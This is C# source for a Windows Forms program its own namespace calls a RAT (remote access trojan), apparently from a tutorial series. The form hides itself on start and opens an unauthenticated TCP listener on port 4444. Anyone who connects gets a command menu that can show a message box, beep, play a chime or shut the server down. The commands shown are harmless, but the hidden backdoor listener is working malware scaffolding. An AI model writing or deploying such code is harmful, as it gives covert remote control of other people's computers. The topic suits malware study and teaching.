using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace _05_ulimited_command_rat
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamReader streamReader;
        StreamWriter streamWriter; //for Server to send back data to
                                   //Client
                                   //Use a separate thread for each command so that the
                                   //server commands can run concurrently instead of blocking
        Thread th_message, th_beep, th_playsound;

        //Commands from Client in enumeration format:
        private enum command
        {
            HELP = 1,
            MESSAGE = 2,
            BEEP = 3,
            PLAYSOUND = 4,
            SHUTDOWNSERVER = 5
        }
        //Help to be sent to Client when it requests for it through the
        //"1" command
        const string strHelp = "Command Menu:\r\n" +
                                "1 This Help\r\n" +
                                "2 Message\r\n" +
                                "3 Beep\r\n" +
                                "4 Playsound\r\n" +
                                "5 Shutdown the Server Process and Port\r\n";

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
            tcpListener.Start();
            for (; ; ) RunServer(); //perpetually spawn socket until
                                    //SHUTDOWN command is received
        }

        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);

            try
            {
                //Let the Client know it has successfully connected.
                streamWriter.Write("Connected to RAT Server. Type 1 for help\r\n");
                streamWriter.Flush();
                string line;
                Int16 intCommand = 0;

                while (true)
                {
                    line = "";
                    line = streamReader.ReadLine();

                    //The Client may send junk characters apart from numbers
                    //therefore, we need to extract those numbers
                    intCommand = GetCommandFromLine(line);

                    //Here is where the commands get processed
                    //Each command is an enumeration declared
                    //earlier, each being an integer

                    // cast int16 -> enumeration
                    switch ((command)intCommand)
                    {
                        case command.HELP:
                            streamWriter.Write(strHelp);
                            streamWriter.Flush(); break;
                        case command.MESSAGE:
                            th_message =
                            new Thread(new ThreadStart(MessageCommand));
                            th_message.Start(); break;
                        case command.BEEP:
                            th_beep = new Thread(new ThreadStart(BeepCommand));
                            th_beep.Start(); break;
                        case command.PLAYSOUND:
                            th_playsound = new Thread(new ThreadStart(PlaySoundCommand));
                            th_playsound.Start(); break;
                        case command.SHUTDOWNSERVER:
                            streamWriter.Flush();
                            CleanUp();
                            System.Environment.Exit(System.Environment.ExitCode);
                            break;
                    }
                }//--end of while loop
            }
            catch (Exception exc)
            {
                CleanUp();
            }
        }//--end of RunServer()

        private void MessageCommand()
        {
            MessageBox.Show("Hello World");
        }

        private void BeepCommand()
        {
            Console.Beep(500, 2000);
        }

        private void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }

        private void CleanUp()
        {
            streamReader.Close();
            networkStream.Close();
            socketForClient.Close();
        }

        //The string 'line' passed from the while-loop contains junk
        //characters, is stored in the local variable as string 'strline'
        //This method then iterates through each character and extracts
        //the numbers and finally converts it into an integer and returns
        //the integer to the while-loop
        private Int16 GetCommandFromLine(string strline)
        {
            Int16 intExtractedCommand = 0;
            int i; Char character;
            StringBuilder stringBuilder = new StringBuilder();
            //Sanity Check: Extracts all the numbers from the stream
            //Iterate through each character in the string and if it
            //is an integer, copy it out to stringBuilder string.
            for (i = 0; i < strline.Length; i++)
            {
                character = Convert.ToChar(strline[i]);
                if (Char.IsDigit(character))
                {
                    stringBuilder.Append(character);
                }
            }
            //Convert the stringBuilder string of numbers to integer
            try
            {
                intExtractedCommand = Convert.ToInt16(stringBuilder.ToString());
            }
            catch (Exception err) { }
            return intExtractedCommand;
        }
    }
}
